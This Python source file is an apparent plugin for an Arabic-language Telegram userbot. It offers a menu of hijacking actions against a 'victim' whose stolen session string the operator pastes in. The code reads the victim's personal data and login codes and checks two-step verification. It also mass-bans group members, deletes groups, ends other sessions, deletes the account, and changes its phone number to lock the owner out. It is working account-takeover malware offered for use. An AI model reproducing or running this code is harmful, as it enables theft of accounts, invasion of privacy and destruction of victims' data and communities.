import asyncio
import os
import re
from os import system

from telethon import Button, events

api_id = os.environ.get("APP_ID")
api_hash = os.environ.get("API_HASH")

from telethon import Button, events

from jmthon.strings import *
from userbot import *

from ..core.session import jmthon, tgbot
from . import *

menu = """
⌔∮ يجب عليك الرد على الرساله اذا كنت تستخدمني في مجموعة

A : [  تحقق من قنوات ومجموعات الحساب ]

B : [ اضهار معلومات الحساب كالرقم والايدي والاسم....الخ]

C : [ لـحظر جميع اعضاء مجموعة معينة]

D : [ تسجيل الدخول الى حساب المستخدم ]

E : [ اشتراك بقناة معينة ]

F : [ مغادرة قناة معينة ]

G : [ حذف قناة او مجموعة ]

H : [ التحقق اذا كان التحقق بخطوتين مفعل ام لا ]

I : [ تسجيل الخروج من جميع الجلسات عدا جلسة البوت ]

J : [ حذف الحساب نهائيا]

K: [ رفع مشرف لشخص معين في قناة او مجموعة ]

L : [ تنزيل جميع المشرفين من مجموعة معينة او قناة ]

M : [ تغيير رقم الهاتف  ]

N : [ لعمل اذاعه لرساله معينه  ]

O : [ لرفعك في جميع المجموعات و القنوات مشرفا  ]
"""

keyboard = [
    [
        Button.inline("A", data="Ahack"),
        Button.inline("B", data="Bhack"),
        Button.inline("C", data="Chack"),
        Button.inline("D", data="Dhack"),
        Button.inline("E", data="Ehack"),
    ],
    [
        Button.inline("F", data="Fhack"),
        Button.inline("G", data="Ghack"),
        Button.inline("H", data="Hhack"),
        Button.inline("I", data="Ihack"),
        Button.inline("J", data="Jhack"),
    ],
    [
        Button.inline("K", data="Khack"),
        Button.inline("L", data="Lhack"),
        Button.inline("M", data="Mhack"),
        Button.inline("N", data="Nhack"),
        Button.inline("O", data="Ohack"),
    ],
    [Button.inline("رجوع", data="osg")],
]


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"jm_hhack")))
async def start(event):
    global menu
    if event.query.user_id == bot.uid:
        await event.delete()
        async with tgbot.conversation(event.chat_id) as x:
            await x.send_message(f"**{menu}**", buttons=keyboard)
    else:
        await event.answer(
            "⌔∮ ليست لديك الصلاحيات لاستخدام هذه الميزه", cache_time=0, alert=True
        )


@jmthon.tgbot.on(
    events.NewMessage(pattern="/rz", func=lambda x: x.sender_id == bot.uid)
)
async def start(event):
    global menu
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message(f"**{menu}**", buttons=keyboard)


@jmthon.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ahack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("⌔∮ ارسل كود تيرمكس الضحيه الان")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "⌔∮ يبدو ان هذا الكود غير صالح \n\n استخدم  /rz", buttons=keyboard
            )
        try:
            i = await userchannels(strses.text)
        except:
            return await event.reply(
                "⌔∮ يبدو ان هذا الكود غير صالح \n\n استخدم  /rz", buttons=keyboard
            )
        if len(i) > 3855:
            file = open("session.txt", "w")
            file.write(i + "\n\nالبيانات بواسطه سورس جمثون")
            file.close()
            await bot.send_file(event.chat_id, "session.txt")
            system("rm -rf session.txt")
        else:
            await event.reply(i + "\n\nشكرا لاستخدامك سورس جمثون", buttons=keyboard)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Bhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("⌔∮ ارسل كود تيرمكس الضحيه الان")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "⌔∮ يبدو ان هذا الكود غير صالح \n\n استخدم  /rz", buttons=keyboard
            )
        i = await userinfo(strses.text)
        await event.reply(i + "\n\nشكرا لاستخدامك سورس جمثون", buttons=keyboard)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Chack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("⌔∮ ارسل كود تيرمكس الضحيه الان")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("❃ عذرا هذا الكود غير صالح", buttons=keyboard)
        await x.send_message("❃ الان ارسل ايدي او معرف القناه او المجموعه")
        grpid = await x.get_response()
        await userbans(strses.text, grpid.text)
        await event.reply("⌔∮ تم التفليش بنجاح.", buttons=keyboard)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Dhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("⌔∮ ارسل كود تيرمكس الضحيه الان")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("❃ عذرا هذا الكود غير صالح.", buttons=keyboard)
        i = await usermsgs(strses.text)
        await event.reply(i + "\n\nشكرا لاستخدامك سورس جمثون", buttons=keyboard)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ehack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("⌔∮ ارسل كود تيرمكس الضحيه الان")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("❃ عذرا هذا الكود غير صالح.", buttons=keyboard)
        await x.send_message("❃ الان ارسل ايدي او معرف القناه او المجموعه")
        grpid = await x.get_response()
        await joingroup(strses.text, grpid.text)
        await event.reply(
            "⌔∮ تم الانضمام الى المجموعة او القناه بنجاح", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Fhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("⌔∮ ارسل كود تيرمكس الضحيه الان")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("❃ عذرا هذا الكود غير صالح.", buttons=keyboard)
        await x.send_message("❃ الان ارسل ايدي او معرف القناه او المجموعه")
        grpid = await x.get_response()
        await leavegroup(strses.text, grpid.text)
        await event.reply("⌔∮ تم مغادره المجموعة او القناه بنجاح,", buttons=keyboard)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ghack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("⌔∮ ارسل كود تيرمكس الضحيه الان")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("❃ عذرا هذا الكود غير صالح.", buttons=keyboard)
        await x.send_message("❃ الان ارسل ايدي او معرف القناه او المجموعه")
        grpid = await x.get_response()
        await delgroup(strses.text, grpid.text)
        await event.reply("⌔∮ تم حذف القناه او المجموعه بنجاح.", buttons=keyboard)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Hhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("⌔∮ ارسل كود تيرمكس الضحيه الان")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("❃ عذرا هذا الكود غير صالح.", buttons=keyboard)
        i = await user2fa(strses.text)
        if i:
            await event.reply(
                "❃ لم يتم تفعيل التحقق بخطوتين.",
                buttons=keyboard,
            )
        else:
            await event.reply("❃ المستخدم مفعل التحقق بخطوتين", buttons=keyboard)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ihack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("⌔∮ ارسل كود تيرمكس الضحيه الان")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("❃ عذرا هذا الكود غير صالح.", buttons=keyboard)
        await terminate(strses.text)
        await event.reply(
            "⌔∮ تم بنجاح انهاء جميع الجلسات عدا جلسه البوت.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Jhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("⌔∮ ارسل كود تيرمكس الضحيه الان")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("❃ عذرا هذا الكود غير صالح.", buttons=keyboard)
        await delacc(strses.text)
        await event.reply(
            "❃ تم حذف الحساب بنجاح.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Khack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("⌔∮ ارسل كود تيرمكس الضحيه الان")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("❃ عذرا هذا الكود غير صالح.", buttons=keyboard)
        await x.send_message("❃ الان ارسل معرف القناه او المجموعه")
        grp = await x.get_response()
        await x.send_message("❃ الان ارسل معرف المستخدم")
        user = await x.get_response()
        await promote(strses.text, grp.text, user.text)
        await event.reply(
            "❃ تم رفع بنجاح بالقناه او المجموعه.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Lhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("⌔∮ ارسل كود تيرمكس الضحيه الان")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("❃ عذرا هذا الكود غير صالح.", buttons=keyboard)
        await x.send_message("❃ الان ارسل معرف القناه او المجموعه")
        pro = await x.get_response()
        try:
            await demall(strses.text, pro.text)
        except:
            pass
        await event.reply(
            "⌔∮ تم تنزيل جميع المستخدمين من القناه او المجموعه.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Mhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("⌔∮ ارسل كود تيرمكس الضحيه الان")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("❃ عذرا هذا الكود غير صالح", buttons=keyboard)
        await x.send_message(
            "❃ ارسل الرقم الجديد الذي تريد التغيير اليه \nملاحظه: لا تستخدم ارقام برنامج 2ndline او برنامج textnow\nاذا استخدمت احدهن ما يوصل لك الكود"
        )
        number = (await x.get_response()).text
        try:
            result = await change_number(strses.text, number)
            await event.respond(
                result
                + "\n انسخ كود الدوله الخاص بالرقم واجلبه هنا ساتوقف لمده  20 ثانيه بعدها ارسل الكود"
            )
            await asyncio.sleep(20)
            await x.send_message("ارسل كود الدوله الخاص بالرقم")
            phone_code_hash = (await x.get_response()).text
            await x.send_message("⌔∮ ارسل كود التحقق الان")
            otp = (await x.get_response()).text
            changing = await change_number_code(
                strses.text, number, phone_code_hash, otp
            )
            if changing:
                await event.respond("❃ تم بنجاح تغيير الرقم")
            else:
                await event.respond("لقد حدث خطأ ما")
        except Exception as e:
            await event.respond("لقد حدث خطأ \n**الخطأ**\n" + str(e))


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ohack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("⌔∮ ارسل كود تيرمكس الضحيه الان")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("❃ عذرا هذا الكود غير صالح.", buttons=keyboard)
        await x.send_message("❃ الان ارسل معرف القناه او المجموعه")
        user = await x.get_response()
        await gpromote(strses.text, user.text)
        await event.reply(
            "❃ تم رفع بنجاح في جميع قنوات و المجموعات",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Nhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("⌔∮ ارسل كود تيرمكس الضحيه الان")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("⌔∮ ههذا الكود غير صالح", buttons=keyboard)
        await x.send_message("⌔∮ الان ارسل الرساله")
        msg = await x.get_response()
        await gcast(strses.text, msg.text)
        await event.reply(
            "❃ تم بنجاح ",
            buttons=keyboard,
        )
